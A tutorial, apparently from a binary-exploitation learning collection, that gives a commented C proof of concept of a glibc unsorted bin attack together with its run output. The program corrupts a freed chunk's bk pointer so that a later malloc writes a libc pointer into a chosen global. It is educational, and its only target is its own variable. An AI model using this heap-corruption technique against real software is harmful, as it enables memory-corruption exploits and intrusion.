# Unsorted Bin Explanation

This is just a well documented C file explaining how an Unsorted Bin Attack works. Make sure you run it on a version of libc without the tcache enabled (I ran it using `libc-2.23.so` on Ubuntu `16.04.6`).

Here is the source code:
```
#include <stdio.h>
#include <stdlib.h>

unsigned long remissions;

int main(void)
{

        puts("So we will be covering an unsorted bin attack.");
        puts("The unsorted bin is a doubly linked list.");
        puts("This attack will allow us to write a pointer to the address of our choosing.");
        puts("While this attack really doesn't give us much control over what we write, we can count on it being a ptr (which will probably be a 'large' integer)");
        puts("Let's get started.\n");

	printf("So our goal will be to overwrite the value of the 'remissions' global variable.\n");
	printf("It is at the bss address: \t%p\n", &remissions);
	printf("With the value: \t\t%0lx\n\n", remissions);

	printf("We will start by allocating two chunks. One to insert into the unsorted bin.\n");
	printf("The other to prevent consolidation with the top chunk.\n");

        unsigned long *ptr0 = malloc(0xf0);
	unsigned long *ptr1 = malloc(0x10);

        printf("We have allocated our first chunk at:\t%p\n", ptr0);

        printf("Now let's free it to insert it into the unsorted bin.\n\n");

        free(ptr0);

        printf("Now that it has been inserted into the unsorted bin, we can see it's fwd and bk pointers.\n");

	printf("fwd:\t0x%lx\n", ptr0[0]);
	printf("bk:\t0x%lx\n\n", ptr0[1]);

	printf("Now when a chunk gets removed from the unsorted bin, a pointer to gets written to it's back chunk.\n");
	printf("Specifically a pointer will get written to bk + 0x10 on x64 (bk + 0x8 for x86).\n");
	printf("That is where we get our ptr write from.\n\n");

	printf("So by using a bug, we can edit the bk pointer of the freed chunk to point to remissions - 0x10.\n");
	printf("That way when the chunk leaves the unsorted bin, the pointer will be written to remissions.\n\n");

	ptr0[1] = (unsigned long)(&remissions - 0x2);

	printf("The current fwd and bk pointers after the write.\n");
	printf("fwd:\t0x%lx\n", ptr0[0]);
	printf("bk:\t0x%lx\n\n", ptr0[1]);


	printf("Now we allocate a new chunk of the same size to remove our freed chunk from the unsorted bin.");
	printf("This will trigger the write to remissions, which has a current value of 0x%lx\n", remissions);

	malloc(0xf0);

	printf("Now we can see that the value of remissions has changed.\n");
	printf("remissions:\t0x%lx\n", remissions);

}
```
Here is it running:
```
$	./unsorted_explanation 
So we will be covering an unsorted bin attack.
The unsorted bin is a doubly linked list.
This attack will allow us to write a pointer to the address of our choosing.
While this attack really doesn't give us much control over what we write, we can count on it being a ptr (which will probably be a 'large' integer)
Let's get started.

So our goal will be to overwrite the value of the 'remissions' global variable.
It is at the bss address: 	0x602058
With the value: 		0

We will start by allocating two chunks. One to insert into the unsorted bin.
The other to prevent consolidation with the top chunk.
We have allocated our first chunk at:	0x2399420
Now let's free it to insert it into the unsorted bin.

Now that it has been inserted into the unsorted bin, we can see it's fwd and bk pointers.
fwd:	0x7ffb7b5fcb78
bk:	0x7ffb7b5fcb78

Now when a chunk gets removed from the unsorted bin, a pointer to gets written to it's back chunk.
Specifically a pointer will get written to bk + 0x10 on x64 (bk + 0x8 for x86).
That is where we get our ptr write from.

So by using a bug, we can edit the bk pointer of the freed chunk to point to remissions - 0x10.
That way when the chunk leaves the unsorted bin, the pointer will be written to remissions.

The current fwd and bk pointers after the write.
fwd:	0x7ffb7b5fcb78
bk:	0x602048

Now we allocate a new chunk of the same size to remove our freed chunk from the unsorted bin.This will trigger the write to remissions, which has a current value of 0x0
Now we can see that the value of remissions has changed.
remissions:	0x7ffb7b5fcb78
```